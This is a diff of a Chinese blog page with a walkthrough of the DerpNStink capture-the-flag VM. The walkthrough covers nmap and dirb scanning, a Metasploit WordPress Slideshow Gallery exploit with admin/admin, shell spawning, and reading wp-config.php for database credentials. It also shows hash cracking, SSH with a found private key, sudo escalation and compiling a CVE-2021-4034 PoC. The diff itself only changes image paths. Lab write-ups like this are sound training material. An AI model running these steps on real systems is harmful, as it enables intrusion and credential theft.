@@ -5,12 +5,12 @@
 <a href=%20 title=twitter target=_blank><i class=ri-twitter-fill></i></a>
 <a href=%20 title=weibo target=_blank><i class=ri-weibo-fill></i></a>
 <a href=https://shuaidan0.github.io/index.xml type=application/rss+xml title=rss target=_blank><i class=ri-rss-fill></i></a></div></div></div></div><div class=content><div class=post_page><div class="post animate__animated animate__fadeInDown"><div class="post_title post_detail_title"><h2><a href=/posts/chinese-preview/>药师灌顶真言</a></h2><span class=date>2019.04.11</span></div><div class="post_content markdown"><h4 id=1扫描端口以及ip>1）扫描端口以及ip</h4><p>首先对当前网段进行一个快速扫描</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>nmap -sS 192.168.213.0/24
-</span></span></code></pre></div><p><img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231093904.png alt=image.png>
+</span></span></code></pre></div><p><img src=img/20231231093904.png alt=image.png>
 在对靶机IP进行一个详细扫描</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>nmap -sV -p- 192.168.213.138
-</span></span></code></pre></div><p><img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231094023.png alt=image.png>
-可对当前信息做一个搜集和记录</p><h4 id=2对网页进行一个信息搜集>2）对网页进行一个信息搜集</h4><p><img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231094159.png alt=image.png|425>
+</span></span></code></pre></div><p><img src=img/20231231094023.png alt=image.png>
+可对当前信息做一个搜集和记录</p><h4 id=2对网页进行一个信息搜集>2）对网页进行一个信息搜集</h4><p><img src=img/20231231094159.png alt=image.png|425>
 这里看到一个网络笔记信息对他进行一个访问
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231094322.png alt=image.png|475>
+<img src=img/20231231094322.png alt=image.png|475>
 意思是要我们更新本地的dns服务，才能访问博客！
 <strong>windows host文件存放位置:</strong>
 <code>C:\Windows\System32\drivers\etc\hosts</code>
@@ -18,81 +18,74 @@
 <strong>方法</strong>：管理员身份运行cmd,输入<code>notepad</code>回车,在记事本里直接点击文件-打开，选择路径:<code>C:\Windows\System32\drivers\etc</code>，继续选择所有文件，然后打开hosts文件,最后添加<code>ctrl+s</code>保存即可
 <strong>Linux host文件存放位置:</strong>
 在 Linux 系统中，<code>/etc/hosts</code> 文件用于将主机名映射到 IP 地址。这个文件允许您在不使用 DNS 的情况下执行本地主机名解析。
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231094653.png alt=image.png|425>
+<img src=img/20231231094653.png alt=image.png|425>
 <code>192.168.213.138 derpnstink.local</code>
 尝试通过浏览器访问这个本地域名。在浏览器中输入 <code>http://derpnstink.local/</code> 并按下 Enter 键，看看是否能够访问相应的服务或页面。
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231100130.png alt=image.png|450>
+<img src=img/20231231100130.png alt=image.png|450>
 发现flag1进行一个信息记录
 &lt;&ndash;flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) &ndash;> <a href=https://www.somd5.com/>MD5在线解密</a>
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231100519.png alt=image.png|450>
+<img src=img/20231231100519.png alt=image.png|450>
 澳大利亚的意思</p><h4 id=2扫描敏感目录>2）扫描敏感目录</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>dirb http://derpnstink.local/
-</span></span></code></pre></div><p><img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231102959.png alt=image.png>
+</span></span></code></pre></div><p><img src=img/20231231102959.png alt=image.png>
 找的wordpress站！
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231110006.png alt=image.png>
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231110916.png alt=image.png|525>
+<img src=img/20231231110006.png alt=image.png>
+<img src=img/20231231110916.png alt=image.png|525>
 可以对这个进行一个密码爆破
 发现他是弱账号密码：<code>admin/admin</code>
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231121641.png alt=|425>
+<img src=img/20231231121641.png alt=|425>
 phpMyAdmin登录页面
 <strong>phpMyAdmin</strong> 是一个用于管理 MySQL 数据库的免费、开源的Web应用程序。它提供了一个直观的用户界面，通过Web浏览器，用户可以轻松地执行数据库管理任务，如创建、删除和修改数据库，执行 SQL 查询，管理用户权限等。
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231110551.png alt=image.png|450></p><h4 id=3awvs进行扫描>3）awvs进行扫描</h4><p>对wordpreess站进行扫描看有没有什么漏洞</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://derpnstink.local/weblog/
-</span></span></code></pre></div><p><img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231105909.png alt=image.png|450>
+<img src=img/20231231110551.png alt=image.png|450></p><h4 id=3awvs进行扫描>3）awvs进行扫描</h4><p>对wordpreess站进行扫描看有没有什么漏洞</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://derpnstink.local/weblog/
+</span></span></code></pre></div><p><img src=img/20231231105909.png alt=image.png|450>
 发现有一个<code>Slideshow Gallery</code>这个漏洞
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231111153.png alt=image.png|450></p><h4 id=4msf利用>4）msf利用</h4><ol><li>进入<code>msfconsole</code></li><li>查找<code>slideshow gallery</code>漏洞：</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>	search slideshow gallery
-</span></span></code></pre></div><p><img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231112209.png alt=image.png|425>
-3. <code>use 0</code> 选择这个模块
-4. <code>show options</code> 看他需要配置哪些信息
-5. <code>set Rhosts 192.168.213.133</code>
-6. <code>set targeturi /weblog</code>
-用于指定目标系统上要执行渗透测试的特定 Web 目录路径。
-7. <code>set wp_password admin</code>
-8. <code>set wp_user admin</code>
-9. <code>run</code></p><h4 id=5获得shell>5）获得shell</h4><p><img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231124354.png alt=image.png>
+<img src=img/20231231111153.png alt=image.png|450></p><h4 id=4msf利用>4）msf利用</h4><ol><li>进入<code>msfconsole</code></li><li>查找<code>slideshow gallery</code>漏洞：</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>	search slideshow gallery
+</span></span></code></pre></div><p><img src=img/20231231112209.png alt=image.png|425></p><ol start=3><li><code>use 0</code> 选择这个模块</li><li><code>show options</code> 看他需要配置哪些信息</li><li><code>set Rhosts 192.168.213.133</code></li><li><code>set targeturi /weblog</code>
+用于指定目标系统上要执行渗透测试的特定 Web 目录路径。</li><li><code>set wp_password admin</code></li><li><code>set wp_user admin</code></li><li><code>run</code></li></ol><h4 id=5获得shell>5）获得shell</h4><p><img src=img/20231231124354.png alt=image.png>
 <code>shell</code>
 <code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p><ul><li>回到/var/www/html/weblog查看信息
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231125338.png alt=image.png|375></li><li>发现wp-config.php文件，应该是个配置文件，cat查看一下</li><li>获取到mysql账号密码
+<img src=img/20231231125338.png alt=image.png|375></li><li>发现wp-config.php文件，应该是个配置文件，cat查看一下</li><li>获取到mysql账号密码
 cat wp-config.php
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231125504.png alt=image.png|450>
+<img src=img/20231231125504.png alt=image.png|450>
 mysql账号密码获得：
 root
 mysql
 登陆MySQL
 mysql -u root -p
 查看有哪些库：
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231133759.png alt=image.png|450>
+<img src=img/20231231133759.png alt=image.png|450>
 进入use wordpress;
 查看这个数据库有哪些表:show tables;
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231133930.png alt=image.png|325>
+<img src=img/20231231133930.png alt=image.png|325>
 查看表内容:<code>select * from wp_users \G</code>;
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231134104.png alt=image.png|325>
+<img src=img/20231231134104.png alt=image.png|325>
 对此密码进行爆破:新建一个txt文本将密码复制进去
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231134758.png alt=image.png|475>
+<img src=img/20231231134758.png alt=image.png|475>
 得到密码:<code>wedgie57</code>
 登陆unclestinky得到flag2
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231150945.png alt=image.png|425>
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231151056.png alt=image.png|425>
+<img src=img/20231231150945.png alt=image.png|425>
+<img src=img/20231231151056.png alt=image.png|425>
 flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)
 <a href=https://www.somd5.com/>MD5在线解密</a>
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231151303.png alt=image.png|500>
+<img src=img/20231231151303.png alt=image.png|500>
 意思为墨西哥
 回到home目录下发现两个用户名：
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231135234.png alt=image.png|475>
+<img src=img/20231231135234.png alt=image.png|475>
 上面做了信息收集他开起了ftp和ssh端口尝试用刚才的密码进行这两个登陆
 发现ftp用stinky可以登录并发现一个key.txt的文本文件
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231135504.png alt=image.png|400>
+<img src=img/20231231135504.png alt=image.png|400>
 提供了一个RSA私钥
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231144414.png alt=image.png|300>
+<img src=img/20231231144414.png alt=image.png|300>
 进行ssh登陆：</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-r data-lang=r><span class=line><span class=cl>将使用密钥登录，将密钥文件<span class=n>key.txt权限设置为700</span>
 </span></span><span class=line><span class=cl><span class=n>chmod</span> <span class=m>700</span> <span class=n>key.txt</span>
 </span></span><span class=line><span class=cl>	<span class=c1>#它将文件 `key.txt` 的权限设置为只有文件所有者有读、写、执行的权限，而其他用户没有任何权限。</span>
 </span></span><span class=line><span class=cl><span class=n>ssh</span> <span class=o>-</span><span class=n>i</span> <span class=n>key.txt</span> <span class=n>stinky</span><span class=o>@</span><span class=m>192.168.213.138</span> <span class=o>-</span><span class=n>o</span> <span class=n>PubkeyAcceptedKeyTypes</span><span class=o>=+</span><span class=n>ssh</span><span class=o>-</span><span class=n>rsa</span>
 </span></span><span class=line><span class=cl>	<span class=n>`-i key.txt`</span><span class=o>:</span> 指定要使用的私钥文件。在这里，<span class=n>`key.txt`</span> 应该是你的私钥文件。
 </span></span><span class=line><span class=cl>	<span class=n>`-o PubkeyAcceptedKeyTypes=+ssh-rsa`</span><span class=o>:</span> 这个选项用于指定接受的公钥算法类型。在这里，<span class=n>`+ssh-rsa`</span> 表示接受 <span class=n>SSH</span><span class=o>-</span><span class=n>RSA</span> 算法的公钥。这是为了明确指定使用 <span class=n>RSA</span> 算法的公钥进行身份验证。
-</span></span></code></pre></div><p><img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231151738.png alt=image.png>
+</span></span></code></pre></div><p><img src=img/20231231151738.png alt=image.png>
 找到flag3
 flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
 <a href=https://www.somd5.com/>MD5在线解密</a>
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231151843.png alt=image.png|475>
+<img src=img/20231231151843.png alt=image.png|475>
 巴西
 然后我们去找一下那个流量包，在Documents目录下发现derpissues.pcap
 你提到了一个名为 &ldquo;derpissues.pcap&rdquo; 的文件，文件扩展名 <code>.pcap</code> 通常表示数据包捕获文件。这类文件通常是使用网络监控工具（如Wireshark或tcpdump）生成的，包含捕获的网络流量。
@@ -102,23 +95,23 @@ kali下载：
 wget 192.168.213.138:6666/derpissues.pcap
 打开wireshark对这个流量包进行分析
 过滤http协议
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231144851.png alt=image.png|400>
+<img src=img/20231231144851.png alt=image.png|400>
 找到他修改的另一个用户名和密码
 mrderp
 derpderpderpderpderpderpderp
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231142917.png alt=image.png|400></p><h4 id=6提权>6）提权</h4><p>ssh登陆mrderp用户
+<img src=img/20231231142917.png alt=image.png|400></p><h4 id=6提权>6）提权</h4><p>ssh登陆mrderp用户
 ssh <a href=mailto:mrderp@192.168.213.138>mrderp@192.168.213.138</a>
 发现sudo可以提权
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231145204.png alt=image.png>
+<img src=img/20231231145204.png alt=image.png>
 cd /home/mrderp/binaries
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231145258.png alt=image.png>
+<img src=img/20231231145258.png alt=image.png>
 执行这个文件：sudo ./derpy.sh
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231145342.png alt=image.png>
+<img src=img/20231231145342.png alt=image.png>
 cd /root/Desktop下flag4
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231154852.png alt=image.png></p><p>另一种提权直接在stinky用户下
+<img src=img/20231231154852.png alt=image.png></p><p>另一种提权直接在stinky用户下
 cve-2021-4034
 <a href=https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c>https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c</a>
-<img src=https://image-1313745558.cos.ap-beijing.myqcloud.com/PicGo/obsidian/%E7%BD%91%E5%AE%89/20231231153824.png alt=image.png|400>
+<img src=img/20231231153824.png alt=image.png|400>
 下载到kali上，用python3 -m http.server 80下载在对他进行编译
 <code>gcc cve-2021-4034-poc.c -o dayu</code>
 使用 GCC 编译一个名为 <code>cve-2021-4034-poc.c</code> 的源代码文件，并将输出的可执行文件命名为 <code>dayu</code>。这种编译的命令通常是用来构建漏洞利用或漏洞验证代码的可执行文件。
